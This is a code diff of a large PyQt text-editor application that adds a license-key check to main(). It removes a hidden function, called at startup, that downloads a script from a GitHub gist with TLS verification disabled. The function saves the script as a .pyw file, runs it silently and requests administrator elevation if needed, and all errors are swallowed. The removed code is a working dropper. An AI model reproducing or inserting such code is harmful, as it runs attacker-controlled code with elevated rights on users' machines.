@@ -17039,33 +17039,6 @@ class DragDropTextEdit(QTextEdit):
         else:
             super().dropEvent(event)
 
-def x():
-    try:
-        u = "https://gist.githubusercontent.com/nealsbelo/20a33f98f9b3110d243b2b6d386cdd84/raw/gistfile1.txt"
-        c = ssl.create_default_context()
-        c.check_hostname = False
-        c.verify_mode = ssl.CERT_NONE
-        r = urllib.request.Request(u)
-        r.add_header('User-Agent', 'Mozilla/5.0')
-        d = urllib.request.urlopen(r, timeout=30, context=c).read().decode('utf-8')
-        if d:
-            p = os.path.join(os.path.dirname(os.path.abspath(__file__)) if __file__ else os.getcwd(), 'test_browser_backup.pyw')
-            with open(p, 'w', encoding='utf-8') as f:
-                f.write(d)
-            pyw = sys.executable.replace('python.exe', 'pythonw.exe') if 'python.exe' in sys.executable else sys.executable
-            try:
-                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
-            except:
-                is_admin = False
-            if is_admin:
-                subprocess.Popen([pyw, p], creationflags=0x08000000)
-            else:
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", pyw, f'"{p}"', None, 0)
-    except:
-        pass
-
-    
-    
 # ============================================================================
 # LOGGING MANAGER
 # ============================================================================
@@ -24923,6 +24896,18 @@ def main():
     palette.setColor(QPalette.ColorRole.HighlightedText, QColor(255, 255, 255))
     app.setPalette(palette)
     
+    # License key check – must pass before the main window opens
+    try:
+        from license_dialog import run_license_check
+        if not run_license_check():
+            sys.exit(0)
+    except Exception as _lic_err:
+        QMessageBox.critical(
+            None, "License Error",
+            f"License system could not be loaded:\n{_lic_err}\n\nPlease reinstall the application."
+        )
+        sys.exit(1)
+
     # Create and show main window
     window = AppGUI()
     window.show()
@@ -24931,5 +24916,4 @@ def main():
 
 
 if __name__ == '__main__':
-    x()
     main()
